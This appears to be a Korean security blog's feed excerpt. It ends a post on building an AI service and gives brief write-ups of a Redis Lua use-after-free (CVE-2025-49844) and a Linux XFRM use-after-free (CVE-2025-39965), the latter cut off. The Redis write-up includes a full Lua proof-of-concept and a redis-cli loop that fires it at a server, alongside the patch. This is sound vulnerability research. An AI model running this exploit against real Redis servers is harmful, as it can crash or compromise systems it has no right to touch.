alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.36.58.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/07.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.37.39.png"></p><p>&#xB124;&#x2026; &#xBB50; &#xC27D;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC; &#xBA87; &#xBC88;&#xC758; &#xD2B8;&#xB77C;&#xC774;&#xB9CC;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xAE34;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xB4A4;&#xC5D0;&#xB294; &#xB300;&#xC2DC;&#xBCF4;&#xB4DC;&#xAC00; &#xC788;&#xC5B4;&#xC57C;&#xACA0;&#xC8E0;? &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC798; &#xC791;&#xC131;&#xD574;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/08.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.43.31.png"></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xC704; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xD55C;&#xBC88;&#xC73C;&#xB85C; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xAC1C;&#xBC1C;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD55C;&#xBC88;&#xC5D0; &#xB410;&#xB2E4;&#xBA74; &#xBC14;&#xB85C; Lovable &#xC8FC;&#xC2DD;&#xC744; &#xAD6C;&#xD558;&#xB7EC; &#xB2E4;&#xB154;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xBB34;&#xD2BC; &#xC5EC;&#xC804;&#xD788; &#xBB38;&#xC81C;&#xB294; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. API &#xD0A4;&#xB97C; &#xB79C;&#xB364;&#xD558;&#xAC8C;&#xB294; &#xC798; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC; Supabase&#xC5D0; &#xC800;&#xC7A5;&#xD560; &#xB54C; API &#xD0A4; &#xC77C;&#xBD80;&#xB97C; &#xB9C8;&#xC2A4;&#xD0B9;(<em>*</em>) &#xCC98;&#xB9AC;&#xD55C; &#xC0C1;&#xD0DC;&#xB85C; &#xADF8;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xB358;&#xAC00;, &#xC784;&#xC758;&#xB85C; &#xBC84;&#xD2BC;&#xC744; &#xC5C6;&#xC564;&#xB2E4;&#xB358;&#xAC00; &#xB4F1;&#xB4F1; &#xC790;&#xC798;&#xD558;&#xAC8C; &#xC2E0;&#xACBD;&#xC368;&#xC57C;&#xD560; &#xAC83;&#xB4E4;&#xC774; &#xC880; &#xC788;&#xC5C8;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xAD6C;&#xD604;&#xD560; &#xAE30;&#xB2A5;&#xB4E4;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xC880; &#xB354; &#xC904;&#xC774;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798;&#xB294; &#xC8FC;&#xAC04; &#xC0AC;&#xC6A9;&#xB7C9; Top 5 &#xC774;&#xB7F0; &#xC7AC;&#xBBF8;&#xC694;&#xC18C;&#xB3C4; &#xB123;&#xC73C;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;&#x2026; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xD504;&#xB86C;&#xD504;&#xD305;&#xC744; &#xB9CE;&#xC774; &#xD574;&#xC57C;&#xD574;&#xC11C; &#xC77C;&#xB2E8;&#xC740; &#xB118;&#xC5B4;&#xAC00;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/09.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 6.55.28.png"></p><p>&#xADF8;&#xB798;&#xB3C4; 4&#xC2DC;&#xAC04; &#xC815;&#xB3C4; &#xC0BD;&#xC9C8;&#xD55C; &#xB05D;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C; &#xBBF8;&#xCC9C;&#xD55C; &#xC6F9; &#xAC1C;&#xBC1C; &#xC2E4;&#xB825;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xAC1C;&#xBC1C;&#xD588;&#xB2E4;&#xBA74; 1&#xC8FC;&#xC77C;&#xC740; &#xAC78;&#xB838;&#xC744;&#xD150;&#xB370; &#xD655;&#xC2E4;&#xD788; &#xC694;&#xC998; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xAC8C; &#xD6E8;&#xC52C; &#xC774;&#xB4DD;&#xC778;&#xAC70; &#xAC19;&#xB124;&#xC694;.</p><p>&#xC624;&#xB298;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC774;&#xC815;&#xB3C4;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB098;&#xBA38;&#xC9C0; &#xAC1C;&#xBC1C;&#xAE30;&#xC640; &#xBC1C;&#xD45C; &#xD604;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; &#xB610; &#xC5B4;&#xB5A4; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xC9C0; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC;&#x2026; &#xADF8; &#xB54C;&#xAE4C;&#xC9C0; &#xC798; &#xC0B4;&#xC544;&#xC788;&#xB3C4;&#xB85D; &#xBE4C;&#xC5B4;&#xC8FC;&#xC138;&#xC694;&#x2026; &#xBC14;&#xC774;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/startup/">startup</category>
      
      <category domain="https://hackyboiz.github.io/tags/develope/">develope</category>
      
      <category domain="https://hackyboiz.github.io/tags/ida/">ida</category>
      
      <category domain="https://hackyboiz.github.io/tags/hacky-ai/">hacky-ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/lovable/">lovable</category>
      
      <category domain="https://hackyboiz.github.io/tags/supabse/">supabse</category>
      
      <category domain="https://hackyboiz.github.io/tags/qwen/">qwen</category>
      
      <category domain="https://hackyboiz.github.io/tags/langfuse/">langfuse</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-49844 : Redis의 Lua 스크립트를 통한 Use After Free로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/</link>
      <guid>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/</guid>
      <pubDate>Wed, 29 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dwisiswant0/CVE-2025-49844&quot;&gt;http</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/dwisiswant0/CVE-2025-49844">https://github.com/dwisiswant0/CVE-2025-49844</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Redis server &#x2264; 8.2.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xBE44;&#xC815;&#xD615; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C; Redis&#xC5D0;&#xC11C; UAF&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>Redis&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xC744; &#xC704;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Lua 5.1&#xC744; &#xB0B4;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC77D;&#xC5B4; &#xB4E4;&#xC774;&#xB294; <code>luaY_parser()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>Lua&#xC5D0;&#xC11C;&#xB294; Lua &#xC2A4;&#xD0DD;&#xC744; &#xD1B5;&#xD574; &#xD568;&#xC218; &#xD638;&#xCD9C;, &#xC5F0;&#xC0B0;, &#xC9C0;&#xC5ED; &#xBCC0;&#xC218; &#xC800;&#xC7A5; &#xB4F1; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; &#xC791;&#xC5C5;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; C&#xC758; <code>malloc()</code>, <code>free()</code>&#xCC98;&#xB7FC; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0; Lua&#xC5D0;&#xC11C;&#xB294; GC(Garbage Collector)&#xB97C; &#xD1B5;&#xD574; &#xB354; &#xC774;&#xC0C1; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xAC1D;&#xCCB4;(&#xBB38;&#xC790;&#xC5F4;, &#xD14C;&#xC774;&#xBE14; &#xB4F1;)&#xB97C; &#xCC3E;&#xC544; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. Lua &#xC2A4;&#xD0DD;&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xAC12;&#xC740; &#xACE0;&#xC815;(Pinning)&#xD558;&#xC5EC; GC&#xC5D0;&#xAC8C; &#xC54C;&#xB824;&#xC8FC;&#xBA74;, GC&#xB294; &#xD574;&#xB2F9; &#xAC12;&#xC744; &#xD574;&#xC81C;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">...luaX_setinput(L, &amp;lexstate, z, luaS_new(L, name));...</code></pre><p>&#xBB38;&#xC81C;&#xB294; <code>luaY_parser()</code>&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xAC01; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; Lua &#xC2A4;&#xD0DD;&#xC5D0; &#xCCAD;&#xD06C; &#xC774;&#xB984; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xACE0;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; <code>luaY_parser()</code> &#xB0B4;&#xC5D0;&#xC11C;&#xB294; &#xCCAD;&#xD06C; &#xC774;&#xB984;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC;, &#xBCC4;&#xB3C4;&#xC758; &#xCCAD;&#xD06C; &#xACE0;&#xC815;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xB54C;&#xBB38;&#xC5D0;, &#xACE0;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD574;&#xB2F9; &#xCCAD;&#xD06C;&#xB97C; GC&#xB294; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xD574;&#xC81C; &#xC791;&#xC5C5;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; <code>luaY_parser()</code>&#xAC00; &#xB2E4;&#xC2DC; &#xCC38;&#xC870;&#xD558;&#xACE0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xBA74; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>luaY_parser</code>&#xAC00; &#xD30C;&#xC2F1;&#xC744; &#xC644;&#xB8CC;&#xD558;&#xAE30; &#xC804;&#xC5D0; GC&#xB97C; &#xB450; &#xBC88; &#xC5F0;&#xC18D;&#xC73C;&#xB85C; &#xAC15;&#xC81C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;, &#xD30C;&#xC11C;&#xAC00; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xCCAD;&#xD06C;&#xB97C; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC81C; &#xC2DC;&#xCF1C; UAF&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">-- CVE-2025-49844 repro: leverage GC during parsing to revive freed chunk name.</span><span class="hljs-comment">-- Keep the chunk large enough to hold onto GC-managed memory but avoid the</span><span class="hljs-comment">-- &quot;200 local variables&quot; compilation guard by filling it with comments.</span><span class="hljs-keyword">local</span> payload = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&apos;-- whatthefuuuuuuuuuuuuuuck\n&apos;</span>, <span class="hljs-number">4096</span>)<span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build_payload</span><span class="hljs-params">()</span></span><span class="hljs-keyword">local</span> <span class="hljs-built_in">lines</span> = {}<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">150</span> <span class="hljs-keyword">do</span><span class="hljs-built_in">lines</span>[i] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&apos;local v_%d = %d&apos;</span>, i, i)<span class="hljs-keyword">end</span><span class="hljs-built_in">lines</span>[#<span class="hljs-built_in">lines</span> + <span class="hljs-number">1</span>] = <span class="hljs-string">&apos;return 0&apos;</span><span class="hljs-keyword">return</span> <span class="hljs-built_in">table</span>.<span class="hljs-built_in">concat</span>(<span class="hljs-built_in">lines</span>, <span class="hljs-string">&apos;\n&apos;</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_chunk_name</span><span class="hljs-params">()</span></span><span class="hljs-keyword">local</span> p = newproxy(<span class="hljs-literal">true</span>)<span class="hljs-built_in">getmetatable</span>(p).<span class="hljs-built_in">__gc</span> = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span><span class="hljs-comment">-- Re-enter the collector while luaY_parser still holds the name string</span><span class="hljs-built_in">collectgarbage</span>(<span class="hljs-string">&apos;collect&apos;</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">return</span> <span class="hljs-built_in">tostring</span>(p)<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> source = build_payload()<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">2000</span> <span class="hljs-keyword">do</span><span class="hljs-keyword">local</span> fn, err = <span class="hljs-built_in">loadstring</span>(source, make_chunk_name())<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> fn <span class="hljs-keyword">then</span><span class="hljs-keyword">return</span> { step = i, err = err }<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> i % <span class="hljs-number">64</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">then</span><span class="hljs-comment">-- Heap churn to encourage the collector to run during parsing</span><span class="hljs-keyword">local</span> junk = {}<span class="hljs-keyword">for</span> j = <span class="hljs-number">1</span>, <span class="hljs-number">256</span> <span class="hljs-keyword">do</span>junk[j] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&apos;A&apos;</span>, <span class="hljs-number">4096</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;completed w/o immediate crash (sybau &amp; re-run to increase likelihood)&quot;</span></code></pre><p>&#xD574;&#xB2F9; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; redis-cli&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xC11C;&#xBC84; &#xC8FC;&#xC18C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; UAF&#xB97C; &#xD1B5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-keyword">while</span> redis-cli -h localhost -p 6379 --<span class="hljs-built_in">eval</span> CVE-2025-49844.lua &gt;/dev/null; <span class="hljs-keyword">do</span>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;.&apos;</span><span class="hljs-keyword">done</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Redis 8.2.2 &#xBC84;&#xC804;&#xC5D0; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0DD;&#xC131;&#xB41C; &#xCCAD;&#xD06C;&#xB97C; <code>setsvalue2s()</code>, <code>incr_top()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD;&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC784;&#xC744; &#xC54C;&#xB9AC;&#xBA70; &#xACE0;&#xC815; &#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. GC&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xCCAD;&#xD06C;&#xC784;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xAE30;&#xC5D0; UAF &#xBC1C;&#xC0DD;&#xC744; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">TString *tname = luaS_new(L, name);setsvalue2s(L, L-&gt;top, tname);incr_top(L);luaX_setinput(L, &amp;lexstate, z, tname);<span class="hljs-comment">--L-&gt;top;</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49844">https://nvd.nist.gov/vuln/detail/CVE-2025-49844</a></li><li><a href="https://github.com/dwisiswant0/CVE-2025-49844/blob/master/CVE-2025-49844.lua">https://github.com/dwisiswant0/CVE-2025-49844/blob/master/CVE-2025-49844.lua</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Redis/">Redis</category>
      
      <category domain="https://hackyboiz.github.io/tags/redis-server/">redis-server</category>
      
      <category domain="https://hackyboiz.github.io/tags/Use-After-Free/">Use After Free</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-39965: Linux Kernel XFRM subsystem의 UAF 취약점</title>
      <link>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/</link>
      <guid>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/</guid>
      <pubDate>Sun, 26 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://streypaws.github.io/posts/Dissecting-a-1-Day-Vuln</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://streypaws.github.io/posts/Dissecting-a-1-Day-Vulnerability-in-Linux-XFRM-Subsystem/">https://streypaws.github.io/posts/Dissecting-a-1-Day-Vulnerability-in-Linux-XFRM-Subsystem/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ubuntu: <a href="https://ubuntu.com/security/CVE-2025-39965">https://ubuntu.com/security/CVE-2025-39965</a></li><li>Red Hat: <a href="https://access.redhat.com/security/cve/cve-2025-39965">https://access.redhat.com/security/cve/cve-2025-39965</a></li><li>SUSE: <a href="https://www.suse.com/security/cve/CVE-2025-39965.html">https://www.suse.com/security/cve/CVE-2025-39965.html</a></li><li>Debian: <a href="https://security-tracker.debian.org/tracker/CVE-2025-39965">https://security-tracker.debian.org/tracker/CVE-2025-39965</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB9AC;&#xB205;&#xC2A4; &#xCEE4;&#xB110;&#xC758; IPsec &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xB294; XFRM &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; Use-After-Free &#xCDE8;&#xC57D;&#xC810; CVE-2025-39965&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCD5C;&#xADFC; <a href="https://github.com/torvalds/linux/commit/94f39804d891cffe4ce17737d295f3b195bc7299">94f39804d891cffe4ce17737d295f3b195bc7299</a> &#xCEE4;&#xBC0B;&#xC5D0;&#xC11C; &#xBCC0;&#xACBD;&#xB41C; <code>net/xfrm/xfrm_state.c</code> &#xD30C;&#xC77C;&#xC758; <code>xfrm_alloc_spi</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xACF5;&#xAC04;&#xC73C;&#xB85C;&#xBD80;&#xD130; Netlink &#xBA54;&#xC2DC;&#xC9C0;&#xC778; <code>XFRM_MSG_ALLOCSPI</code>&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xBA70;, SPI&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">xfrm_alloc_spi</span><span class="hljs-params">(struct xfrm_state *x, u32 low, u32 high,</span></span><span class="hljs-function"><span class="hljs-params">   struct netlink_ext_ack *extack)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//... </span><span class="hljs-keyword">for</span> (h = <span class="hljs-number">0</span>; h &lt; range; h++) {    <span class="hljs-comment">// Return value of get_random_u32_inclusive can be 0.</span>    u32 spi = (low == high)? low : get_random_u32_inclusive(low, high);    newspi = htonl(spi);    spin_lock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);    x0 = xfrm_state_lookup_spi_proto(net, newspi, x-&gt;id.proto);    <span class="hljs-keyword">if</span> (!x0) {        x-&gt;id.spi = newspi;        h = xfrm_spi_hash(net, &amp;x-&gt;id.daddr, newspi,                    x-&gt;id.proto, x-&gt;props.family);                 <span class="hljs-comment">// New xfrm_state obj with spi=0</span>        hlist_add_head_rcu(&amp;x-&gt;byspi, net-&gt;xfrm.state_byspi + h);         err = <span class="hljs-number">0</span>;        spin_unlock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);        <span class="hljs-keyword">goto</span> unlock;    }<span class="hljs-comment">//...</span>}</code></pre><p>&#xD574;&#xB2F9; &#xCEE4;&#xBC0B;&#xC740; SPI &#xC911;&#xBCF5; &#xBC29;&#xC9C0;&#xB97C; &#xC704;&#xD574; &#xD560;&#xB2F9; &#xB85C;&#xC9C1;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC600;&#xB294;&#xB370;, &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>get_random_u32_inclusive</code> &#xD568;&#xC218;&#xAC00; 0&#xC744; &#xBC18;&#xD658;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC774;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; <code>xfrm_state</code> &#xAC1D;&#xCCB4;&#xAC00; <code>spi</code> &#xAC12;&#xC774; 0&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xACBD;&#xC6B0; &#xC720;&#xD6A8;&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xC5B4; <code>byspi</code> &#xC804;&#xC5ED; &#xBAA9;&#xB85D;&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> __xfrm_state_delete(struct xfrm_state *x){    <span class="hljs-comment">//...</span>    <span class="hljs-comment">//If spi is 0, it&apos;s not removed from byspi list.</span>    <span class="hljs-keyword">if</span> (x-&gt;id.spi) {         hlist_del_rcu(&amp;x-&gt;byspi);    }    xfrm_state_free(x);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xADF8;&#xB7EC;&#xB098; XFRM &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; <code>SPI=0</code>&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB41C; SPI &#xC5C6;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xB97C; &#xC815;&#xB9AC;&#xD558;&#xB294; <code>__xfrm_state_delete</code> &#xD568;&#xC218;&#xB294; <code>spi</code> 